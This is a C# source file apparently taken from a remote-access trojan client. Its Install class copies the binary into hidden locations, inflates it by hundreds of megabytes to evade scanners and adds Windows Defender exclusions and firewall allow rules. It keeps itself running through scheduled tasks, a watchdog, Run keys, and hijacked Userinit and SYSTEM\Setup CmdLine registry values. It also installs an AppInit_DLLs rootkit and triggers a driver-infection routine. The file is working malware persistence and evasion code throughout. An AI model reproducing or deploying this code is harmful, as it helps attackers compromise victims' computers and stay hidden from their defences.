using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper;

internal class Install
{
	public static bool Installing = true;

	public static bool TaskNormalized = false;

	public static void Run()
	{
		try
		{
			using (Mutex.OpenExisting(Config.Mutex))
			{
				return;
			}
		}
		catch (WaitHandleCannotBeOpenedException)
		{
		}
		catch
		{
		}
		if (Config.DriverInfection == "true")
		{
			DriverInfector.Run();
		}
		if (Config.UseInstallAdmin == "true" && Config.Privilege == "User")
		{
			if (TaskCheck(Config.TaskClient) && File.Exists(Config.PathClient))
			{
				RunTask(Config.TaskClient);
				Methods.Exit();
			}
			if (Config.InstallWatchDog != "false" && TaskCheck(Config.TaskWatchDog) && File.Exists(Config.PathWatchDog))
			{
				RunTask(Config.TaskWatchDog);
				Methods.Exit();
			}
			int num = 0;
			while (num < 3)
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo(Methods.GetExecutablePath());
				processStartInfo.Verb = "runas";
				try
				{
					Process.Start(processStartInfo);
					Methods.Exit();
				}
				catch
				{
					break;
				}
				finally
				{
					num++;
				}
			}
		}
		if (Config.InstallWatchDog == "true")
		{
			try
			{
				string fullPath = Path.GetFullPath(Config.PathWatchDog);
				if (string.Equals(Path.GetFullPath(Methods.GetExecutablePath()), fullPath, StringComparison.OrdinalIgnoreCase))
				{
					Loop();
				}
			}
			catch
			{
			}
		}
		string b = "";
		string text = "";
		try
		{
			b = Path.GetFullPath(Methods.GetExecutablePath());
			text = Path.GetFullPath(Config.PathClient);
		}
		catch
		{
		}
		if (!string.IsNullOrEmpty(text) && !string.Equals(text, b, StringComparison.OrdinalIgnoreCase))
		{
			Loop();
			return;
		}
		new Thread((ThreadStart)delegate
		{
			Loop();
		}).Start();
	}

	public static void CopyFile(string sourceFilePath, string destinationFilePath)
	{
		using FileStream fileStream = new FileStream(sourceFilePath, FileMode.Open, FileAccess.Read);
		using FileStream fileStream2 = new FileStream(destinationFilePath, FileMode.Create, FileAccess.Write);
		byte[] array = new byte[1024];
		int count;
		while ((count = fileStream.Read(array, 0, array.Length)) > 0)
		{
			fileStream2.Write(array, 0, count);
		}
		if (Config.Pump == EncryptString.Decode("true"))
		{
			if (long.TryParse(Config.PumpSizeBytes, out var result) && result > fileStream2.Length)
			{
				fileStream2.SetLength(result);
			}
			else
			{
				fileStream2.SetLength(fileStream2.Length + new Random().Next(700, 750) * 1024 * 1024);
			}
		}
	}

	public static string GetCmdlineTargetPath(string cmdline)
	{
		if (string.IsNullOrWhiteSpace(cmdline))
		{
			return null;
		}
		cmdline = cmdline.Trim();
		int num = cmdline.LastIndexOf('"');
		if (num > 0)
		{
			int num2 = cmdline.LastIndexOf('"', num - 1);
			if (num2 >= 0 && num > num2 + 1)
			{
				return cmdline.Substring(num2 + 1, num - num2 - 1);
			}
		}
		return cmdline;
	}

	public static void Loop()
	{
		while (Installing && (!(Config.Install != "true") || !(Config.CmdlineAutorun != "true")))
		{
			if (Config.Install == "true")
			{
				if (!Directory.Exists(Path.GetDirectoryName(Config.PathClient)))
				{
					Directory.CreateDirectory(Path.GetDirectoryName(Config.PathClient));
				}
				if (!File.Exists(Config.PathClient))
				{
					try
					{
						CopyFile(Methods.GetExecutablePath(), Config.PathClient);
						if (Config.ExclusionWD != "false")
						{
							WindowsDefenderExclusion.Exc(Config.PathClient);
						}
						netSh(Config.PathClient, "WindowsControl");
					}
					catch
					{
					}
				}
				if (!TaskNormalized)
				{
					try
					{
						DeletingTask(Config.TaskClient);
					}
					catch
					{
					}
					SchtasksOnLogon(Config.PathClient, Config.TaskClient);
					try
					{
						if (!TaskCheck(Config.TaskClient))
						{
							if (!File.Exists(Config.PathClient))
							{
								Methods.GetExecutablePath();
							}
							else
							{
								_ = Config.PathClient;
							}
						}
					}
					catch
					{
					}
					TaskNormalized = true;
				}
				try
				{
					string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), EncryptString.Decode("Tasks"));
					string path2 = Path.Combine(path, Config.TaskClient);
					if (File.Exists(path2))
					{
						SecrityHidden.ProtectFile(path2);
					}
					if (Config.InstallWatchDog == "true")
					{
						string path3 = Path.Combine(path, Config.TaskWatchDog);
						if (File.Exists(path3))
						{
							SecrityHidden.ProtectFile(path3);
						}
					}
				}
				catch
				{
				}
			}
			bool flag = Config.Install == "true" && TaskCheck(Config.TaskClient);
			if (Config.Install == "true" && Config.UserInit == "true" && !flag)
			{
				UserINIT(Config.PathClient);
			}
			if (Config.CmdlineAutorun == "true" && !flag)
			{
				string cmdlineTargetPath = GetCmdlineTargetPath(Config.CmdlinePath);
				if (!string.IsNullOrEmpty(cmdlineTargetPath))
				{
					try
					{
						string directoryName = Path.GetDirectoryName(cmdlineTargetPath);
						if (!string.IsNullOrEmpty(directoryName) && !Directory.Exists(directoryName))
						{
							Directory.CreateDirectory(directoryName);
						}
						if (!File.Exists(cmdlineTargetPath))
						{
							CopyFile(Methods.GetExecutablePath(), cmdlineTargetPath);
							if (Config.ExclusionWD == "true")
							{
								WindowsDefenderExclusion.Exc(cmdlineTargetPath);
							}
						}
					}
					catch
					{
					}
					try
					{
						SecrityHidden.ProtectFile(cmdlineTargetPath);
					}
					catch
					{
					}
				}
				if (!CmdlineAutorun(Config.CmdlinePath))
				{
					string cmdlineTargetPath2 = GetCmdlineTargetPath(Config.CmdlinePath);
					if (!string.IsNullOrEmpty(cmdlineTargetPath2))
					{
						AddStartupLauncher(cmdlineTargetPath2, Config.TaskClient);
						try
						{
							SecrityHidden.ProtectFile(cmdlineTargetPath2);
						}
						catch
						{
						}
					}
				}
			}
			if (flag)
			{
				try
				{
					UserInitRemove();
				}
				catch
				{
				}
				try
				{
					CmdlineAutorunRemove();
				}
				catch
				{
				}
			}
			if (Config.Install == "true")
			{
				try
				{
					SecrityHidden.ProtectFile(Config.PathClient);
					string directoryName2 = Path.GetDirectoryName(Config.PathClient);
					if (!string.IsNullOrEmpty(directoryName2) && Directory.Exists(directoryName2))
					{
						SecrityHidden.ProtectFile(directoryName2);
					}
				}
				catch
				{
				}
				if (Config.InstallWatchDog == "true")
				{
					if (!Directory.Exists(Path.GetDirectoryName(Config.PathWatchDog)))
					{
						Directory.CreateDirectory(Path.GetDirectoryName(Config.PathWatchDog));
					}
					if (!File.Exists(Config.PathWatchDog))
					{
						CopyFile(Methods.GetExecutablePath(), Config.PathWatchDog);
						if (Config.ExclusionWD == "true")
						{
							WindowsDefenderExclusion.Exc(Config.PathWatchDog);
						}
					}
					Schtasks(Config.PathWatchDog, Config.TaskWatchDog, 30);
					try
					{
						SecrityHidden.ProtectFile(Config.PathWatchDog);
						string directoryName3 = Path.GetDirectoryName(Config.PathWatchDog);
						if (!string.IsNullOrEmpty(directoryName3) && Directory.Exists(directoryName3))
						{
							SecrityHidden.ProtectFile(directoryName3);
						}
					}
					catch
					{
					}
					if (Methods.GetExecutablePath() == Config.PathWatchDog)
					{
						Methods.Exit();
					}
				}
			}
			while (true)
			{
				if (Config.Install == "true")
				{
					string fullPath = Path.GetFullPath(Methods.GetExecutablePath());
					string fullPath2 = Path.GetFullPath(Config.PathClient);
					if (!string.Equals(fullPath2, fullPath, StringComparison.OrdinalIgnoreCase))
					{
						try
						{
							if (!File.Exists(fullPath2))
							{
								CopyFile(fullPath, fullPath2);
							}
							ProcessStartInfo processStartInfo = new ProcessStartInfo();
							processStartInfo.FileName = fullPath2;
							if (Config.Privilege == "Admin")
							{
								processStartInfo.Verb = "runas";
							}
							processStartInfo.UseShellExecute = true;
							Process process = new Process();
							process.StartInfo = processStartInfo;
							process.Start();
							Methods.Exit();
						}
						catch
						{
						}
					}
					if (!string.Equals(fullPath2, fullPath, StringComparison.OrdinalIgnoreCase))
					{
						break;
					}
					Thread.Sleep(10000);
					continue;
				}
				if (Config.CmdlineAutorun == "true")
				{
					Installing = false;
				}
				break;
			}
			try
			{
				using (Mutex.OpenExisting(Config.Mutex))
				{
					if (!MutexControl.createdNew)
					{
						Methods.Exit();
					}
				}
			}
			catch (WaitHandleCannotBeOpenedException)
			{
			}
			catch
			{
			}
			Thread.Sleep(5000);
		}
	}

	public static void RmRootkit()
	{
		using (RegistryKey registryKey = Registry.LocalMachine)
		{
			RegistryKey? registryKey2 = registryKey.OpenSubKey(EncryptString.Decode("SOFTWARE")).OpenSubKey(EncryptString.Decode("Microsoft")).OpenSubKey(EncryptString.Decode("Windows NT"))
				.OpenSubKey(EncryptString.Decode("CurrentVersion"))
				.OpenSubKey(EncryptString.Decode("Windows"), writable: true);
			registryKey2.SetValue(EncryptString.Decode("AppInit_DLLs"), "");
			registryKey2.SetValue(EncryptString.Decode("LoadAppInit_DLLs"), 0, RegistryValueKind.DWord);
			registryKey2.SetValue(EncryptString.Decode("RequireSignedAppInit_DLLs"), 1, RegistryValueKind.DWord);
		}
		Process.Start(new ProcessStartInfo
		{
			UseShellExecute = false,
			CreateNoWindow = true,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			FileName = EncryptString.Decode("cmd"),
			Verb = EncryptString.Decode("runas"),
			Arguments = EncryptString.Decode("/C taskkill /im explorer.exe /f && TimeOut 2 && start explorer.exe")
		});
	}

	public static void AddRootkit(string fullpath)
	{
		using RegistryKey registryKey = Registry.LocalMachine;
		RegistryKey registryKey2 = registryKey.OpenSubKey(EncryptString.Decode("SOFTWARE")).OpenSubKey(EncryptString.Decode("Microsoft")).OpenSubKey(EncryptString.Decode("Windows NT"))
			.OpenSubKey(EncryptString.Decode("CurrentVersion"))
			.OpenSubKey(EncryptString.Decode("Windows"), writable: true);
		if (registryKey2.GetValue(EncryptString.Decode("AppInit_DLLs")) == null || !((string)registryKey2.GetValue(EncryptString.Decode("AppInit_DLLs")) == fullpath))
		{
			registryKey2.SetValue(EncryptString.Decode("AppInit_DLLs"), fullpath);
			registryKey2.SetValue(EncryptString.Decode("LoadAppInit_DLLs"), 1, RegistryValueKind.DWord);
			registryKey2.SetValue(EncryptString.Decode("RequireSignedAppInit_DLLs"), 0, RegistryValueKind.DWord);
		}
	}

	public static string Uninstall()
	{
		Installing = false;
		Thread.Sleep(2000);
		string text = Path.GetTempFileName() + EncryptString.Decode(".bat");
		string text2 = EncryptString.Decode("timeout 10 > NUL\n") + EncryptString.Decode("CD \"") + Path.GetDirectoryName(Config.PathClient) + EncryptString.Decode("\"\n") + EncryptString.Decode("DEL \"") + Path.GetFileName(Config.PathClient) + EncryptString.Decode("\" /f /q\n");
		string text3 = "schtasks /end /TN \"" + Config.TaskClient + "\"\n" + "schtasks /delete /F /TN \"" + Config.TaskClient + "\"\n" + "if exist \"%SystemRoot%\\System32\\Tasks\\" + Config.TaskClient + "\" del /f /q \"%SystemRoot%\\System32\\Tasks\\" + Config.TaskClient + "\"\n" + "schtasks /end /TN \"" + Config.TaskWatchDog + "\"\n" + "schtasks /delete /F /TN \"" + Config.TaskWatchDog + "\"\n" + "if exist \"%SystemRoot%\\System32\\Tasks\\" + Config.TaskWatchDog + "\" del /f /q \"%SystemRoot%\\System32\\Tasks\\" + Config.TaskWatchDog + "\"\n" + "taskkill /f /im \"" + Path.GetFileName(Config.PathClient) + "\"\n";
		text2 = text3 + text2;
		DeletingTask(Config.TaskClient);
		try
		{
			string path = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), EncryptString.Decode("Tasks")), Config.TaskClient);
			if (File.Exists(path))
			{
				File.Delete(path);
			}
		}
		catch
		{
		}
		if (Config.HiddenFile == EncryptString.Decode("true"))
		{
			SecrityHidden.Unlock(Config.PathClient);
		}
		string text4 = null;
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EncryptString.Decode("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"), writable: false);
			text4 = ((registryKey != null) ? (registryKey.GetValue(EncryptString.Decode("Userinit")) as string) : null);
		}
		catch
		{
		}
		if (!string.IsNullOrEmpty(text4))
		{
			string[] array = text4.Split(new char[1] { ',' }, StringSplitOptions.RemoveEmptyEntries);
			for (int i = 0; i < array.Length; i++)
			{
				string text5 = array[i].Trim().Trim(new char[1] { '"' });
				if (string.IsNullOrEmpty(text5) || text5.EndsWith(EncryptString.Decode("userinit.exe"), StringComparison.OrdinalIgnoreCase))
				{
					continue;
				}
				bool flag = false;
				try
				{
					flag = string.Equals(Path.GetFullPath(text5), Path.GetFullPath(Config.PathClient), StringComparison.OrdinalIgnoreCase);
				}
				catch
				{
					flag = string.Equals(text5, Config.PathClient, StringComparison.OrdinalIgnoreCase);
				}
				if (!flag)
				{
					continue;
				}
				try
				{
					if (Config.HiddenFile == EncryptString.Decode("true"))
					{
						SecrityHidden.Unlock(text5);
					}
					if (File.Exists(text5))
					{
						File.Delete(text5);
					}
					if (!string.Equals(text5, Config.PathClient, StringComparison.OrdinalIgnoreCase) && !string.IsNullOrEmpty(Path.GetDirectoryName(text5)) && !string.IsNullOrEmpty(Path.GetFileName(text5)))
					{
						text2 = text2 + EncryptString.Decode("CD \"") + Path.GetDirectoryName(text5) + EncryptString.Decode("\"\n") + EncryptString.Decode("DEL \"") + Path.GetFileName(text5) + EncryptString.Decode("\" /f /q\n");
					}
				}
				catch
				{
				}
				break;
			}
		}
		UserInitRemove();
		CmdlineAutorunRemove();
		string cmdlineTargetPath = GetCmdlineTargetPath(Config.CmdlinePath);
		if (!string.IsNullOrEmpty(cmdlineTargetPath))
		{
			try
			{
				if (Config.HiddenFile == EncryptString.Decode("true"))
				{
					SecrityHidden.Unlock(cmdlineTargetPath);
				}
				if (File.Exists(cmdlineTargetPath))
				{
					File.Delete(cmdlineTargetPath);
				}
				text2 = text2 + EncryptString.Decode("CD \"") + Path.GetDirectoryName(cmdlineTargetPath) + EncryptString.Decode("\"\n") + EncryptString.Decode("DEL \"") + Path.GetFileName(cmdlineTargetPath) + EncryptString.Decode("\" /f /q\n");
			}
			catch
			{
			}
		}
		DeletingTask(Config.TaskWatchDog);
		if (Config.InstallWatchDog == EncryptString.Decode("true"))
		{
			try
			{
				string path2 = Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), EncryptString.Decode("Tasks")), Config.TaskWatchDog);
				if (File.Exists(path2))
				{
					File.Delete(path2);
				}
			}
			catch
			{
			}
			if (Config.HiddenFile != EncryptString.Decode("false"))
			{
				SecrityHidden.Unlock(Config.PathWatchDog);
			}
			File.Delete(Config.PathWatchDog);
			text2 = text2 + EncryptString.Decode("CD \"") + Path.GetDirectoryName(Config.PathWatchDog) + EncryptString.Decode("\"\n") + EncryptString.Decode("DEL \"") + Path.GetFileName(Config.PathWatchDog) + EncryptString.Decode("\" /f /q\n");
		}
		text2 = text2 + "schtasks /end /TN \"" + Config.TaskClient + "\"\n" + "schtasks /delete /F /TN \"" + Config.TaskClient + "\"\n" + "if exist \"%SystemRoot%\\System32\\Tasks\\" + Config.TaskClient + "\" del /f /q \"%SystemRoot%\\System32\\Tasks\\" + Config.TaskClient + "\"\n" + "schtasks /end /TN \"" + Config.TaskWatchDog + "\"\n" + "schtasks /delete /F /TN \"" + Config.TaskWatchDog + "\"\n" + "if exist \"%SystemRoot%\\System32\\Tasks\\" + Config.TaskWatchDog + "\" del /f /q \"%SystemRoot%\\System32\\Tasks\\" + Config.TaskWatchDog + "\"\n" + "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /t REG_SZ /d \"C:\\\\Windows\\\\System32\\\\userinit.exe,\" /f\n" + "reg delete \"HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /f\n";
		text2 = text2 + EncryptString.Decode("CD \"") + Path.GetDirectoryName(text) + EncryptString.Decode("\"\n") + EncryptString.Decode("DEL \"") + Path.GetFileName(text) + EncryptString.Decode("\" /f /q\n");
		File.WriteAllText(text, text2);
		return text;
	}

	public static void netSh(string path, string name)
	{
		if (!(Config.Privilege == EncryptString.Decode("User")))
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = EncryptString.Decode("CMD");
			processStartInfo.Arguments = EncryptString.Decode("netsh advfirewall firewall add rule name=\"" + name + "\" dir=in action=allow program=\"") + path + EncryptString.Decode("\" enable=yes & exit");
			processStartInfo.Verb = EncryptString.Decode("runas");
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
		}
	}

	private static void AddRunStartup(string path, string name)
	{
	}

	private static void AddStartupLauncher(string path, string name)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey != null)
			{
				string value = "\"" + path + "\"";
				registryKey.SetValue(string.IsNullOrEmpty(name) ? "WindowsControl" : name, value);
			}
		}
		catch
		{
		}
	}

	private static void SchtasksOnLogon(string Path, string Name)
	{
		if (!TaskCheck(Name))
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = EncryptString.Decode("cmd");
			processStartInfo.Arguments = EncryptString.Decode("/c schtasks /create /f /sc onlogon /tn \"") + Name + EncryptString.Decode("\" /tr \"") + Path + EncryptString.Decode("\" ");
			if (Config.Privilege == "Admin")
			{
				processStartInfo.Verb = "runas";
			}
			processStartInfo.Arguments += EncryptString.Decode("& exit");
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
		}
	}

	public static bool TaskCheck(string name)
	{
		return File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), EncryptString.Decode("Tasks"), name));
	}

	private static void DeletingTask(string name)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = EncryptString.Decode("CMD");
		processStartInfo.Arguments = EncryptString.Decode("/c schtasks /delete /F /TN \"") + name + EncryptString.Decode("\" & exit");
		if (Config.Privilege == "Admin")
		{
			processStartInfo.Verb = "runas";
		}
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	public static void RunTask(string taskname)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = EncryptString.Decode("CMD");
		processStartInfo.Arguments = EncryptString.Decode("/c schtasks /run /i /tn \"") + taskname + EncryptString.Decode("\"");
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static void Schtasks(string Path, string Name, int minut)
	{
		if (!TaskCheck(Name))
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = EncryptString.Decode("cmd");
			processStartInfo.Arguments = EncryptString.Decode("/c schtasks /create /f /sc minute /mo ") + minut + EncryptString.Decode(" /tn \"") + Name + EncryptString.Decode("\" /tr \"") + Path + EncryptString.Decode("\" ");
			if (Config.Privilege == "Admin")
			{
				processStartInfo.Arguments += EncryptString.Decode("/RL HIGHEST ");
				processStartInfo.Verb = "runas";
			}
			processStartInfo.Arguments += EncryptString.Decode("& exit");
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
		}
	}

	public static bool UserINIT(string Name)
	{
		try
		{
			try
			{
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EncryptString.Decode("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"), writable: true);
				if (registryKey != null && ((string)registryKey.GetValue(EncryptString.Decode("Userinit"), "")).Contains(Name))
				{
					registryKey.SetValue(EncryptString.Decode("Userinit"), EncryptString.Decode("C:\\Windows\\System32\\userinit.exe,"));
				}
			}
			catch
			{
			}
			using RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(EncryptString.Decode("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"));
			string obj2 = (string)registryKey2.GetValue(EncryptString.Decode("Userinit"), "");
			string text = EncryptString.Decode("C:\\Windows\\System32\\userinit.exe,") + Name + ",";
			if (obj2 != text)
			{
				registryKey2.SetValue(EncryptString.Decode("Userinit"), text);
			}
			registryKey2.Close();
		}
		catch
		{
			return false;
		}
		return true;
	}

	public static void UserInitRemove()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(EncryptString.Decode("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\winlogon"), writable: true);
			if (registryKey != null)
			{
				registryKey.DeleteValue(EncryptString.Decode("Userinit"), throwOnMissingValue: false);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static bool CmdlineAutorun(string cmdlinePath)
	{
		if (string.IsNullOrWhiteSpace(cmdlinePath))
		{
			return false;
		}
		string text = cmdlinePath.Trim();
		if (!text.Contains("\""))
		{
			text = "\"" + text + "\"";
		}
		if (Config.Privilege == "Admin")
		{
			try
			{
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\Setup", writable: true);
				if (registryKey != null)
				{
					registryKey.SetValue("CmdLine", text);
					registryKey.SetValue("SetupType", 2, RegistryValueKind.DWord);
					registryKey.Close();
					return true;
				}
			}
			catch
			{
				return false;
			}
		}
		return false;
	}

	public static void CmdlineAutorunRemove()
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EncryptString.Decode("SYSTEM\\Setup"), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(EncryptString.Decode("CmdLine"), "");
				registryKey.SetValue(EncryptString.Decode("SetupType"), 0, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}
}
